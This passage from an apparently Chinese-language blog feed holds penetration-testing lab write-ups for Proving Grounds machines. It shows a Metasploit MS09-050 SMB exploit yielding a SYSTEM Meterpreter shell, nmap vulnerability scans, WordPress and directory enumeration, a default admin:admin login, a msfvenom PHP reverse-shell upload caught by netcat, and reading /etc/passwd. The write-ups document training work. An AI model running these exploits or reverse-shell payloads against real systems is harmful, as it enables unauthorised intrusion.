class="number">.40</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Started reverse TCP handler on <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Connecting to the target (<span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span>)...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Sending the exploit packet (<span class="number">951</span> bytes)...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">445</span> - Waiting up to <span class="number">180</span> seconds for exploit to trigger...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Sending stage (<span class="number">176198</span> bytes) to <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">:</span><span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span><span class="punctuation">:</span><span class="number">49159</span>) at <span class="number">2025</span><span class="number">-02</span><span class="number">-06</span> <span class="number">11</span><span class="punctuation">:</span><span class="number">56</span><span class="punctuation">:</span><span class="number">42</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username<span class="punctuation">:</span> NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">2684</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">6.0</span><span class="number">.6001</span><span class="punctuation">]</span></span><br><span class="line">Copyright (c) <span class="number">2006</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;hostname</span><br><span class="line">hostname</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . <span class="punctuation">:</span></span><br><span class="line">   IPv4 Address. . . . . . . . . . . <span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line">   Subnet Mask . . . . . . . . . . . <span class="punctuation">:</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">   Default Gateway . . . . . . . . . <span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.254</span></span><br><span class="line"></span><br><span class="line">Tunnel adapter Local Area Connection*<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . <span class="punctuation">:</span> Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . <span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">Tunnel adapter Local Area Connection* <span class="number">9</span><span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . <span class="punctuation">:</span> Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . <span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li><p>autorecon执行的是</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap -vv --reason -Pn -T4 -sV -p <span class="number">445</span> <span class="string">&quot;--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot;</span> <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line"></span><br><span class="line">nmap <span class="string">&quot;--script=smb-vuln*&quot;</span> -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>发现的漏洞是ms17-010, 而</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap -script=smb-vuln\* -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br></pre></td></tr></table></figure>

<p>能扫到 ms09-050<br>以后应该autorecon 扫一次， nmap再手动扫一次</p>
<p>后续测试：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap <span class="string">&quot;--script=smb-vuln*&quot;</span> -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br></pre></td></tr></table></figure>
<p>也能扫到ms09-050</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nmap -script=smb-vuln\* -p445 <span class="number">192.168</span><span class="number">.197</span><span class="number">.40</span></span><br><span class="line">|_smb-vuln-ms10<span class="number">-054</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">| smb-security-mode<span class="punctuation">:</span></span><br><span class="line">|   account_used<span class="punctuation">:</span> &lt;blank&gt;</span><br><span class="line">|   authentication_level<span class="punctuation">:</span> user</span><br><span class="line">|   challenge_response<span class="punctuation">:</span> supported</span><br><span class="line">|_  message_signing<span class="punctuation">:</span> disabled (dangerous<span class="punctuation">,</span> but default)</span><br><span class="line">| smb2-time<span class="punctuation">:</span></span><br><span class="line">|   date<span class="punctuation">:</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-06</span>T07<span class="punctuation">:</span><span class="number">01</span><span class="punctuation">:</span><span class="number">34</span></span><br><span class="line">|_  start_date<span class="punctuation">:</span> <span class="number">2025</span><span class="number">-01</span><span class="number">-06</span>T19<span class="punctuation">:</span><span class="number">52</span><span class="punctuation">:</span><span class="number">49</span></span><br><span class="line">| smb2-capabilities<span class="punctuation">:</span></span><br><span class="line">|   <span class="number">2</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span></span><br><span class="line">|_    Distributed File System</span><br><span class="line">| smb-mbenum<span class="punctuation">:</span></span><br><span class="line">|_  ERROR<span class="punctuation">:</span> Call to Browser Service failed with status = <span class="number">2184</span></span><br><span class="line">| smb-vuln-cve2009<span class="number">-3103</span><span class="punctuation">:</span></span><br><span class="line">|   VULNERABLE<span class="punctuation">:</span></span><br><span class="line">|   SMBv2 exploit (CVE<span class="number">-2009</span><span class="number">-3103</span><span class="punctuation">,</span> Microsoft Security Advisory <span class="number">975497</span>)</span><br><span class="line">|     State<span class="punctuation">:</span> VULNERABLE</span><br><span class="line">|     IDs<span class="punctuation">:</span>  CVE<span class="punctuation">:</span>CVE<span class="number">-2009</span><span class="number">-3103</span></span><br><span class="line">|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold<span class="punctuation">,</span> SP1<span class="punctuation">,</span> and SP2<span class="punctuation">,</span></span><br><span class="line">|           Windows Server <span class="number">2008</span> Gold and SP2<span class="punctuation">,</span> and Windows <span class="number">7</span> RC allows remote attackers to execute arbitrary code or cause a</span><br><span class="line">|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</span><br><span class="line">|           PROTOCOL REQUEST packet<span class="punctuation">,</span> which triggers an attempted dereference of an out-of-bounds memory location<span class="punctuation">,</span></span><br><span class="line">|           aka <span class="string">&quot;SMBv2 Negotiation Vulnerability.&quot;</span></span><br><span class="line">|</span><br><span class="line">|     Disclosure date<span class="punctuation">:</span> <span class="number">2009</span><span class="number">-09</span><span class="number">-08</span></span><br><span class="line">|     References<span class="punctuation">:</span></span><br><span class="line">|       https<span class="punctuation">:</span><span class="comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line">|_      http<span class="punctuation">:</span><span class="comment">//www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line">| smb-os-discovery<span class="punctuation">:</span></span><br><span class="line">|   OS<span class="punctuation">:</span> Windows Server (R) <span class="number">2008</span> Standard <span class="number">6001</span> Service Pack <span class="number">1</span> (Windows Server (R) <span class="number">2008</span> Standard <span class="number">6.0</span>)</span><br><span class="line">|   OS CPE<span class="punctuation">:</span> cpe<span class="punctuation">:</span>/o<span class="punctuation">:</span>microsoft<span class="punctuation">:</span>windows_server_2008<span class="punctuation">:</span><span class="punctuation">:</span>sp1</span><br><span class="line">|   Computer name<span class="punctuation">:</span> internal</span><br><span class="line">|   NetBIOS computer name<span class="punctuation">:</span> INTERNAL\x00</span><br><span class="line">|   Workgroup<span class="punctuation">:</span> WORKGROUP\x00</span><br><span class="line">|_  System time<span class="punctuation">:</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-05</span>T23<span class="punctuation">:</span><span class="number">06</span><span class="punctuation">:</span><span class="number">38</span><span class="number">-08</span><span class="punctuation">:</span><span class="number">00</span></span><br><span class="line">|_smb-vuln-ms10<span class="number">-061</span><span class="punctuation">:</span> NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-brute<span class="punctuation">:</span></span><br><span class="line">|_  guest<span class="punctuation">:</span>&lt;blank&gt; =&gt; Valid credentials<span class="punctuation">,</span> account disabled</span><br><span class="line">|_smb-print-text<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">|_smb-flood<span class="punctuation">:</span> ERROR<span class="punctuation">:</span> Script execution failed (use -d to debug)</span><br><span class="line">| smb-vuln-ms17<span class="number">-010</span><span class="punctuation">:</span></span><br><span class="line">|   VULNERABLE<span class="punctuation">:</span></span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17<span class="number">-010</span>)</span><br><span class="line">|     State<span class="punctuation">:</span> VULNERABLE</span><br></pre></td></tr></table></figure>

<p>多扫几次？</p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Extplorer</title>
    <url>/post/20250216172300.html</url>
    <content><![CDATA[<h1 id="Difficuty"><a href="#Difficuty" class="headerlink" title="Difficuty"></a>Difficuty</h1><p>Midum</p>
<h1 id="scans"><a href="#scans" class="headerlink" title="scans"></a>scans</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.2</span>p1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">80.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br></pre></td></tr></table></figure>

<h1 id="80-wordpress"><a href="#80-wordpress" class="headerlink" title="80 wordpress"></a>80 wordpress</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.212.16:80 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">321</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-content/]</span></span><br><span class="line">/wordpress            (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">320</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wordpress/]</span></span><br><span class="line">/wp-includes          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/]</span></span><br><span class="line">/wp-admin             (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">319</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/]</span></span><br></pre></td></tr></table></figure>

<p>wpscan 确认版本6.2， 没扫描到插件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">wpscan --url http<span class="punctuation">:</span><span class="comment">//192.168.212.16 -v</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__<span class="punctuation">,</span>_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version <span class="number">3.8</span><span class="number">.27</span></span><br><span class="line">       Sponsored by Automattic - https<span class="punctuation">:</span><span class="comment">//automattic.com/</span></span><br><span class="line">       @_WPScan_<span class="punctuation">,</span> @ethicalhack3r<span class="punctuation">,</span> @erwan_lr<span class="punctuation">,</span> @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> URL<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/ [192.168.212.16]</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Effective URL<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/setup-config.php</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Started<span class="punctuation">:</span> Sat Feb <span class="number">15</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">15</span><span class="punctuation">:</span><span class="number">32</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">Interesting Finding(s)<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Headers</span><br><span class="line"> | Interesting Entry<span class="punctuation">:</span> Server<span class="punctuation">:</span> Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br><span class="line"> | Found By<span class="punctuation">:</span> Headers (Passive Detection)</span><br><span class="line"> | Confidence<span class="punctuation">:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> WordPress readme found<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/readme.html</span></span><br><span class="line"> | Found By<span class="punctuation">:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence<span class="punctuation">:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> WordPress version <span class="number">6.2</span> identified (Insecure<span class="punctuation">,</span> released on <span class="number">2023</span><span class="number">-03</span><span class="number">-29</span>).</span><br><span class="line"> | Found By<span class="punctuation">:</span> Most Common Wp Includes Query Parameter In Homepage (Passive Detection)</span><br><span class="line"> |  - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/css/dashicons.min.css?ver=6.2</span></span><br><span class="line"> | Confirmed By<span class="punctuation">:</span></span><br><span class="line"> |  Common Wp Includes Query Parameter In Homepage (Passive Detection)</span><br><span class="line"> |   - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/css/buttons.min.css?ver=6.2</span></span><br><span class="line"> |  Style Etag (Aggressive Detection)</span><br><span class="line"> |   - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/load-styles.php, Match: &#x27;6.2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> The main theme could not be detected.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> No plugins Found.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">08</span> &lt;=================================================================&gt; (<span class="number">137</span> / <span class="number">137</span>) <span class="number">100.00</span>% Time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">08</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> No Config Backups Found.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> No WPScan API Token given<span class="punctuation">,</span> as a result vulnerability data has not been output.</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> You can get a free API token with <span class="number">25</span> daily requests by registering at https<span class="punctuation">:</span><span class="comment">//wpscan.com/register</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Finished<span class="punctuation">:</span> Sat Feb <span class="number">15</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2025</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Requests Done<span class="punctuation">:</span> <span class="number">169</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Cached Requests<span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Data Sent<span class="punctuation">:</span> <span class="number">35.328</span> KB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Data Received<span class="punctuation">:</span> <span class="number">42.482</span> KB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Memory used<span class="punctuation">:</span> <span class="number">208.801</span> MB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Elapsed time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">01</span><span class="punctuation">:</span><span class="number">18</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-55.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-57.png.png"></p>
<p>测试默认账号密码都没有结果</p>
<h1 id="foodhold"><a href="#foodhold" class="headerlink" title="foodhold"></a>foodhold</h1><p>gobuster扫到目录filemanager</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirb/common.txt -u http://192.168.212.16:80 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirb/common.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess            (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/.htpasswd            (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/.hta                 (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/filemanager          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/filemanager/]</span></span><br><span class="line">/index.php            (Status<span class="punctuation">:</span> <span class="number">302</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80/wp-admin/setup-config.php]</span></span><br><span class="line">/server-status        (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/wordpress            (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">320</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wordpress/]</span></span><br><span class="line">/wp-admin             (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">319</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/]</span></span><br><span class="line">/wp-content           (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">321</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-content/]</span></span><br><span class="line">/wp-includes          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/]</span></span><br><span class="line">/xmlrpc.php           (Status<span class="punctuation">:</span> <span class="number">302</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80/wp-admin/setup-config.php]</span></span><br><span class="line">Progress<span class="punctuation">:</span> <span class="number">4614</span> / <span class="number">4615</span> (<span class="number">99.98</span>%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>使用admin:admin可以登录，并且有上传文件权限，<code>msfvenom -p php/reverse_php LHOST=192.168.45.184 LPORT=4444 -f raw -o shell.php</code> 生成webshell上传，curl ip:port&#x2F;filemanager&#x2F;shell.php 得到shell</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-58.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-56.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">]</span> <span class="number">57546</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span>root<span class="punctuation">:</span>/root<span class="punctuation">:</span>/bin/bash</span><br><span class="line">daemon<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span>daemon<span class="punctuation">:</span>/usr/sbin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">bin<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span>bin<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sys<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">:</span>sys<span class="punctuation">:</span>/dev<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">sync<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="number">65534</span><span class="punctuation">:</span>sync<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/bin/sync</span><br><span class="line">games<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="number">60</span><span class="punctuation">:</span>games<span class="punctuation">:</span>/usr/games<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">man<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="number">12</span><span class="punctuation">:</span>man<span class="punctuation">:</span>/var/cache/man<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">lp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span>lp<span class="punctuation">:</span>/var/spool/lpd<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">mail<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span>mail<span class="punctuation">:</span>/var/mail<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">news<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span>news<span class="punctuation">:</span>/var/spool/news<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">uucp<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span>uucp<span class="punctuation">:</span>/var/spool/uucp<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">proxy<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span>proxy<span class="punctuation">:</span>/bin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">www-data<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span><span class="number">33</span><span class="punctuation">:</span>www-data<span class="punctuation">:</span>/var/www<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">backup<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span><span class="number">34</span><span class="punctuation">:</span>backup<span class="punctuation">:</span>/var/backups<span 